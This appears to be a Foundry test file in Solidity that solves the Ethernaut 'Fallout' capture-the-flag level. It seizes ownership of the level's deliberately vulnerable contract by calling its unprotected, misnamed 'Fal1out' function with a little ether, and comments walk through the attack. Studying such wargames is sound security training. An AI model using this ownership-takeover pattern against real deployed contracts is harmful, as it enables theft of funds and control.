// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function testFalloutHack() public {
        /****************
         * Factory setup *
         *************** */
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
        /*
         * The goal is to claim ownership of the contract
         * if we study the contract, there is an unprotected function get change ownership
         *
         * Walkthrough:
         * 1) Here the function to change ownership is not protected
         * A simple call with a bit of ETH is enough to gain ownership
         */
        // -- 1 --
        ethernautFallout.Fal1out{value: 0.1 ether}();
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
